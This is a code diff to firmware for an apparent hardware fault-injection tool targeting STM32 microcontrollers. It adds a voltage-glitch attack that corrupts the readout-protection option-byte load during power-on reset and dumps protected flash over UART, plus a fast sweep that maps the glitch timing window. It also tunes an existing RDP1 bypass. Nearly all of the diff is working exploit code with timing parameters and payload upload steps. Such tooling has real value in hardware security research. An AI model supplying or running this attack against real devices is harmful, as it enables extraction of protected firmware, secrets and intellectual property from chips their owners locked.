@@ -1651,23 +1651,27 @@ static float adc_read_voltage(void) {
 
 // Auto-detect target via SWD if not already set. Returns target info or NULL.
 static const stm32_target_info_t *ensure_target_type(void) {
-    extern bool swd_connect(void);
+    extern bool swd_ensure_connected(void);
+    extern bool swd_clear_errors(void);
     extern bool swd_detect(uint32_t *cpuid_out, uint32_t *dbg_idcode_out);
-    extern void swd_init(void);
     extern void swd_deinit(void);
 
     const stm32_target_info_t *info = stm32_get_target_info(current_target_type);
     if (info)
         return info;
 
-    // Try SWD IDCODE auto-detection
+    // Not set — auto-detect the same robust way `SWD IDCODE` does: energise the
+    // target (power-off is the boot default), ensure the SWD link is up, and
+    // clear any sticky errors a prior glitch left behind, THEN read the DEV_ID.
+    // The old bare swd_connect() path skipped the power-on + error-clear and
+    // faulted (ACK=0x7) whenever a preceding glitch left the target mid-boot.
     uart_cli_send("No target set, attempting SWD auto-detect...\r\n");
-    swd_init();
-    if (!swd_connect()) {
-        swd_deinit();
+    target_power_ensure_on();
+    if (!swd_ensure_connected()) {
         uart_cli_send("ERROR: SWD connect failed. Set target with TARGET or SWD IDCODE\r\n");
         return NULL;
     }
+    swd_clear_errors();
 
     uint32_t cpuid, dbg_id;
     if (!swd_detect(&cpuid, &dbg_id)) {
@@ -2544,7 +2548,7 @@ static const rdp_bypass_payload_t *get_rdp_bypass_payload(target_type_t type) {
     }
 }
 
-void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
+void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv) {
     if (power_group_glitch_blocked()) return;
     extern bool swd_connect(void);
     extern bool swd_halt(void);
@@ -2567,7 +2571,15 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
         return;
     }
 
-    if (!sweep_calibrated) {
+    if (glitch_mv > 0) {
+        // Explicit voltage supplied — use it directly and skip the sweep, so a
+        // known-good depth (from a prior TARGET GLITCH SWEEP) can be re-applied
+        // without re-sweeping every run.
+        sweep_optimal_thresh = (float)glitch_mv / 1000.0f;
+        sweep_calibrated = true;
+        uart_cli_printf("Using supplied glitch voltage: %.2fV (%lu mV) — skipping sweep\r\n",
+                        sweep_optimal_thresh, (unsigned long)glitch_mv);
+    } else if (!sweep_calibrated) {
         uart_cli_send("No sweep calibration — running SWEEP first...\r\n\r\n");
         target_power_sweep();
         if (!sweep_calibrated) {
@@ -2728,24 +2740,26 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
 
     // === Step 5: Set BOOT0=0, pulse nRST — stage 2 sends flash via UART ===
-    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
+    // Matches Joe Grand's stm32-fault-injection notebook (cell 30): BOOT0=LOW,
+    // BOOT1 stays HIGH, nRST held LOW ~50ms, then DRIVEN high (not released to a
+    // pull-up), ~100ms settle before reading.
+    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST (JG timing)...\r\n");
     uart_cli_send("[6] Receiving flash dump via UART...\r\n");
     gpio_put(BOOT0_PIN, 0);
-    gpio_put(BOOT1_PIN, 0);
+    /* BOOT1 left HIGH (matches JG tio3=True; BOOT0=0 makes flash-boot anyway) */
     sleep_ms(10);
 
     // Drain FIFO before reset
     while (uart_is_readable(TARGET_UART_ID))
         uart_getc(TARGET_UART_ID);
 
-    // Pulse nRST — system reset preserves FPB
+    // Pulse nRST — system reset preserves FPB. Match JG: 50ms low, drive high.
     gpio_init(reset_pin);
     gpio_set_dir(reset_pin, GPIO_OUT);
     gpio_put(reset_pin, 0);
-    sleep_ms(10);
-    gpio_put(reset_pin, 1);
-    gpio_set_dir(reset_pin, GPIO_IN);
-    gpio_pull_up(reset_pin);
+    sleep_ms(50);
+    gpio_put(reset_pin, 1);       // drive HIGH (do not release to pull-up)
+    sleep_ms(100);                // settle before reading, like JG's time.sleep(0.1)
 
     // Helper: receive exactly n bytes with timeout, returns bytes received
     #define BYPASS_TIMEOUT_US 5000000  // 5 second total timeout
@@ -2868,6 +2882,315 @@ bypass_cleanup:
     // Restore boot pins
     gpio_put(BOOT0_PIN, 0);
     gpio_put(BOOT1_PIN, 0);
+}
+
+// STM32 RDP1 SHADOW-load glitch bypass. Same proven FPB chain as target_power_bypass
+// (stage1 SRAM-boot -> configure FPB -> BOOT0=0 + nRST -> stage2 direct read), but
+// step 3 attempts to CORRUPT THE RDP OPTION-BYTE SHADOW LOAD during the POR recovery
+// with a precisely-timed voltage dip (Joe Grand's downgrade-glitch idea) so the chip
+// comes up effectively-RDP0 for the session. Sweeps glitch offset x width. Success =
+// stage2 emits "RDP1" header + real (non-0xFF) flash. Verification is debugger-free
+// (the FPB/UART path) because at RDP1 an SWD flash read is blocked while debug is
+// attached. NOTE: GP10/11/12 is a slow GPIO-sourced rail; this is a best-effort
+// software glitch — a fast crowbar on VCAP is the "proper" tool.
+void target_power_shadowbypass(uint32_t max_attempts, uint32_t dump_bytes, uint32_t glitch_mv) {
+    if (power_group_glitch_blocked()) return;
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info) return;
+    const rdp_bypass_payload_t *bp = get_rdp_bypass_payload(target_get_type());
+    if (!bp) { uart_cli_printf("ERROR: No BYPASS payload for %s\r\n", info->name); return; }
+
+    uint32_t sram_base = bp->load_base;
+    uint32_t payload_words = (bp->size + 3) / 4;
+    if (dump_bytes == 0) dump_bytes = 64;
+    if (dump_bytes > 256) dump_bytes = 256;
+    dump_bytes = (dump_bytes + 3) & ~3u;
+    if (max_attempts == 0) max_attempts = 2000;
+
+    // Sweep bands (microseconds after the power-restore edge). Brief brownout =>
+    // fast recovery, so the shadow-load window is us-scale. Tunable.
+    const uint32_t OFF_MIN = 5, OFF_MAX = 1500, OFF_STEP = 5;
+    const uint32_t WIDTHS[] = {5, 10, 20, 40};
+    const int NW = (int)(sizeof(WIDTHS) / sizeof(WIDTHS[0]));
+
+    // Optional calibrated dip depth. glitch_mv>0 => the recovery dip is ADC-gated
+    // to that voltage (drop rail, poll ADC0/GP26 until <= thresh, then dwell WIDTH)
+    // instead of the legacy uncontrolled fixed-time low pull. Establish the value
+    // with TARGET GLITCH SWEEP (its optimal threshold), then pass it here.
+    uint16_t glitch_thresh = glitch_mv ? (uint16_t)((uint32_t)glitch_mv * 4095u / 3300u) : 0;
+
+    uart_cli_printf("RDP1 SHADOW-glitch bypass: %s, offset %lu..%luus/step%lu, widths 5/10/20/40us, up to %lu attempts\r\n",
+                    info->name, OFF_MIN, OFF_MAX, OFF_STEP, max_attempts);
+    if (glitch_thresh)
+        uart_cli_printf("Dip depth: ADC-gated to %.2fV (%lu mV, thresh=%u)\r\n",
+                        (float)glitch_mv / 1000.0f, (unsigned long)glitch_mv, glitch_thresh);
+    else
+        uart_cli_send("Dip depth: uncontrolled fixed-time low pull (no voltage given)\r\n");
+    uart_cli_send("Success = stage2 'RDP1' header + non-0xFF flash. (slow GPIO rail; best-effort)\r\n");
+
+    // Upload payload once (SRAM is writable over SWD even at RDP1).
+    swd_init();
+    if (!swd_connect()) { swd_deinit(); uart_cli_send("ERROR: SWD connect failed\r\n"); return; }
+    swd_halt();
+    if (swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words) != payload_words) {
+        uart_cli_send("ERROR: SRAM upload failed\r\n"); swd_deinit(); return;
+    }
+    swd_resume();
+    swd_deinit();
+    uart_cli_send("Payload uploaded to SRAM.\r\n");
+
+    gpio_init(BOOT0_PIN); gpio_set_dir(BOOT0_PIN, GPIO_OUT); gpio_put(BOOT0_PIN, 1);
+    gpio_init(BOOT1_PIN); gpio_set_dir(BOOT1_PIN, GPIO_OUT); gpio_put(BOOT1_PIN, 1);
+    gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(50);
+    adc_power_init();
+
+    // UART RX ready on GP5 @115200 8N1.
+    uart_deinit(TARGET_UART_ID);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    uint32_t attempt = 0, effects = 0, reuploads = 0;
+    uint32_t off = OFF_MIN; int wi = 0;
+    bool success = false;
+
+    while (attempt < max_attempts && !success) {
+        attempt++;
+        uint32_t width = WIDTHS[wi];
+
+        // Periodically re-upload the payload (a dip may have lost SRAM).
+        if (attempt % 64 == 0) {
+            gpio_put(BOOT0_PIN, 0);
+            swd_init();
+            if (swd_connect()) {
+                swd_halt();
+                swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
+                swd_resume();
+                reuploads++;
+            }
+            swd_deinit();
+            gpio_put(BOOT0_PIN, 1);
+            gpio_set_mask(POWER_MASK);
+            sleep_ms(5);
+        }
+
+        // --- Step 3: brownout to trigger POR (retain SRAM), then a timed dip
+        //     during the recovery to corrupt the RDP option-byte shadow load. ---
+        gpio_set_dir(POWER_PIN2, GPIO_IN); gpio_set_dir(POWER_PIN3, GPIO_IN);
+        gpio_disable_pulls(POWER_PIN2); gpio_disable_pulls(POWER_PIN3);
+        adc_select_input(ADC_POWER_CHAN);
+        gpio_clr_mask(1u << POWER_PIN1);
+        uint64_t tb = time_us_64();
+        while (adc_read() > 1490 /* ~1.2V => below BOR */) {
+            if (time_us_64() - tb > 200000) break;
+        }
+        // Restore rail => recovery begins (t0).
+        gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_set_mask(POWER_MASK);
+        uint64_t t0 = time_us_64();
+        while ((uint32_t)(time_us_64() - t0) < off) tight_loop_contents();
+        // Glitch dip: ADC-gated to the calibrated depth if a voltage was given
+        // (drop, poll until <= thresh, then dwell WIDTH us past it), else the
+        // legacy fixed-time low pull for `width` us.
+        gpio_clr_mask(POWER_MASK);
+        uint64_t td = time_us_64();
+        if (glitch_thresh) {
+            adc_select_input(ADC_POWER_CHAN);
+            while (adc_read() > glitch_thresh) {
+                if ((uint32_t)(time_us_64() - td) > 2000) break;  // 2ms safety cap
+            }
+            uint64_t tw = time_us_64();
+            while ((uint32_t)(time_us_64() - tw) < width) tight_loop_contents();
+        } else {
+            while ((uint32_t)(time_us_64() - td) < width) tight_loop_contents();
+        }
+        gpio_set_mask(POWER_MASK);
+
+        // Let stage1 boot from SRAM and configure the FPB.
+        sleep_ms(80);
+
+        // --- Launch stage2: BOOT0=0 + nRST pulse (system reset preserves FPB &
+        //     the glitched RDP shadow) ---
+        gpio_put(BOOT0_PIN, 0);
+        while (uart_is_readable(TARGET_UART_ID)) uart_getc(TARGET_UART_ID);
+        gpio_init(reset_pin); gpio_set_dir(reset_pin, GPIO_OUT);
+        gpio_put(reset_pin, 0); sleep_ms(20);
+        gpio_put(reset_pin, 1); sleep_ms(30);
+
+        // --- Capture: wait briefly for the "RDP1" header ---
+        uint8_t hs = 0; bool hdr = false; uint64_t rs = time_us_64();
+        while ((uint32_t)(time_us_64() - rs) < 250000) {
+            if (uart_is_readable(TARGET_UART_ID)) {
+                uint8_t c = uart_getc(TARGET_UART_ID);
+                const char *H = "RDP1";
+                if (c == H[hs]) { hs++; if (hs == 4) { hdr = true; break; } }
+                else hs = (c == 'R') ? 1 : 0;
+            }
+        }
+
+        if (hdr) {
+            effects++;
+            uint8_t cid[4]; bool ok = true;
+            for (int i = 0; i < 4 && ok; i++) {
+                uint64_t t = time_us_64();
+                while (!uart_is_readable(TARGET_UART_ID)) {
+                    if (time_us_64() - t > 150000) { ok = false; break; }
+                }
+                if (ok) cid[i] = uart_getc(TARGET_UART_ID);
+            }
+            uint8_t db[256]; uint32_t got = 0, nonff = 0;
+            while (got < dump_bytes) {
+                uint64_t t = time_us_64(); bool r = false;
+                while ((uint32_t)(time_us_64() - t) < 150000) {
+                    if (uart_is_readable(TARGET_UART_ID)) { r = true; break; }
+                }
+                if (!r) break;
+                uint8_t b = uart_getc(TARGET_UART_ID);
+                db[got++] = b;
+                if (b != 0xFF) nonff++;
+            }
+            uart_cli_printf("\r\n*** [%lu] HEADER off=%luus w=%luus CPUID=%02X%02X%02X%02X got=%lu nonFF=%lu ***\r\n",
+                            attempt, ok ? cid[3] : 0, ok ? cid[2] : 0, ok ? cid[1] : 0, ok ? cid[0] : 0,
+                            got, nonff);
+            if (nonff > 0) {
+                success = true;
+                uart_cli_send("=== SHADOW BYPASS — FLASH DUMP ===");
+                for (uint32_t i = 0; i < got; i++) {
+                    if (i % 16 == 0) uart_cli_printf("\r\n0x%08lX:", 0x08000000UL + i);
+                    uart_cli_printf(" %02X", db[i]);
+                }
+                uart_cli_send("\r\n");
+            }
+        }
+
+        if (attempt % 50 == 0)
+            uart_cli_printf("  [%lu/%lu] off=%luus w=%luus effects=%lu reup=%lu\r\n",
+                            attempt, max_attempts, off, width, effects, reuploads);
+
+        // Advance sweep: width inner, offset outer.
+        wi++;
+        if (wi >= NW) { wi = 0; off += OFF_STEP; if (off > OFF_MAX) off = OFF_MIN; }
+    }
+
+    if (!success)
+        uart_cli_printf("\r\nSHADOW sweep done: %lu attempts, %lu header-effects, no readable flash.\r\n",
+                        attempt, effects);
+    else
+        uart_cli_send("\r\n*** SHADOW GLITCH SUCCESS — flash read at RDP1 ***\r\n");
+
+    gpio_put(BOOT0_PIN, 0); gpio_put(BOOT1_PIN, 0);
+    gpio_set_mask(POWER_MASK);
+}
+
+// FAST timing pre-screen for the shadow-load glitch. Same brownout-POR + timed dip
+// as SHADOWBYPASS step 3, but instead of the full FPB chain it just reconnects SWD
+// AFTER the glitch and reads FLASH_OPTCR (peripheral space, readable at RDP1) to see
+// whether the RDP byte / any OPTCR bits moved away from the locked baseline. One SWD
+// round-trip per attempt => sweeps offset x width far faster, mapping the window.
+// CAVEATS (by design): (1) SWD is connected only AFTER the glitch, so it doesn't
+// perturb the fault; (2) a transient shadow corruption can re-settle before the read
+// (under-reports); (3) the flash-enforcement latch may differ from these OPTCR bits,
+// so "no OPTCR change" is NOT proof of failure — confirm promising offsets with the
+// full SHADOWBYPASS. Any OPTCR change (esp. RDP byte -> 0xAA) = the glitch reached the
+// option-byte load.
+void target_power_shadowscan(uint32_t max_attempts) {
+    if (power_group_glitch_blocked()) return;
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern bool swd_connect(void);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info) return;
+    uint32_t optcr_addr = info->flash_optr;   // F4: 0x40023C14
+    if (max_attempts == 0) max_attempts = 5000;
+
+    const uint32_t OFF_MIN = 5, OFF_MAX = 1500, OFF_STEP = 5;
+    const uint32_t WIDTHS[] = {5, 10, 20, 40};
+    const int NW = (int)(sizeof(WIDTHS) / sizeof(WIDTHS[0]));
+
+    // Power on and read the baseline OPTCR.
+    gpio_init(BOOT0_PIN); gpio_set_dir(BOOT0_PIN, GPIO_OUT); gpio_put(BOOT0_PIN, 0);
+    gpio_init(BOOT1_PIN); gpio_set_dir(BOOT1_PIN, GPIO_OUT); gpio_put(BOOT1_PIN, 0);
+    gpio_set_dir(POWER_PIN1, GPIO_OUT); gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(100);
+    adc_power_init();
+
+    uint32_t base = 0xFFFFFFFF;
+    swd_init();
+    bool bcon = swd_connect();
+    bool brd = bcon && (swd_read_mem(optcr_addr, &base, 1) == 1);
+    swd_deinit();
+    if (!brd) { uart_cli_send("ERROR: could not read baseline OPTCR over SWD\r\n"); return; }
+    uart_cli_printf("SHADOWSCAN: OPTCR @0x%08lX baseline=0x%08lX (RDP byte=0x%02lX), up to %lu attempts\r\n",
+                    optcr_addr, base, (base >> 8) & 0xFF, max_attempts);
+    uart_cli_send("Glitch POR + timed dip, then SWD-read OPTCR. Logging any change from baseline.\r\n");
+
+    uint32_t off = OFF_MIN; int wi = 0;
+    uint32_t attempt = 0, changes = 0, noconn = 0, rdp0 = 0;
+
+    while (attempt < max_attempts) {
+        attempt++;
+        uint32_t width = WIDTHS[wi];
+
+        // --- brownout POR (retain nothing needed here) + timed dip ---
+        gpio_set_dir(POWER_PIN2, GPIO_IN); gpio_set_dir(POWER_PIN3, GPIO_IN);
+        gpio_disable_pulls(POWER_PIN2); gpio_disable_pulls(POWER_PIN3);
+        adc_select_input(ADC_POWER_CHAN);
+        gpio_clr_mask(1u << POWER_PIN1);
+        uint64_t tb = time_us_64();
+        while (adc_read() > 1490) { if (time_us_64() - tb > 200000) break; }
+        gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_set_mask(POWER_MASK);
+        uint64_t t0 = time_us_64();
+        while ((uint32_t)(time_us_64() - t0) < off) tight_loop_contents();
+        gpio_clr_mask(POWER_MASK);
+        uint64_t td = time_us_64();
+        while ((uint32_t)(time_us_64() - td) < width) tight_loop_contents();
+        gpio_set_mask(POWER_MASK);
+
+        // --- let rail recover, then SWD-read OPTCR (connect AFTER the glitch) ---
+        sleep_ms(8);
+        uint32_t v = 0xFFFFFFFF;
+        swd_init();
+        bool con = swd_connect();
+        bool rd = con && (swd_read_mem(optcr_addr, &v, 1) == 1);
+        swd_deinit();
+
+        if (!con || !rd) {
+            noconn++;
+        } else if (v != base) {
+            changes++;
+            uint8_t rdp = (v >> 8) & 0xFF;
+            bool is_rdp0 = (rdp == info->rdp_level0);   // 0xAA
+            if (is_rdp0) rdp0++;
+            uart_cli_printf("  *CHANGE* [%lu] off=%luus w=%luus OPTCR 0x%08lX->0x%08lX RDPbyte 0x%02lX->0x%02X%s\r\n",
+                            attempt, off, width, base, v, (base >> 8) & 0xFF, rdp,
+                            is_rdp0 ? "  <<< RDP0!" : "");
+        }
+
+        if (attempt % 200 == 0)
+            uart_cli_printf("  [%lu/%lu] off=%luus changes=%lu (rdp0=%lu) noconn=%lu\r\n",
+                            attempt, max_attempts, off, changes, rdp0, noconn);
+
+        wi++;
+        if (wi >= NW) { wi = 0; off += OFF_STEP; if (off > OFF_MAX) off = OFF_MIN; }
+    }
+
+    uart_cli_printf("\r\nSHADOWSCAN done: %lu attempts, %lu OPTCR changes (%lu to RDP0), %lu no-connect.\r\n",
+                    attempt, changes, rdp0, noconn);
+    gpio_set_mask(POWER_MASK);
 }
 
 // STM32F1 RDP1 bypass via SWD halt + FPB redirect (no power glitch needed)
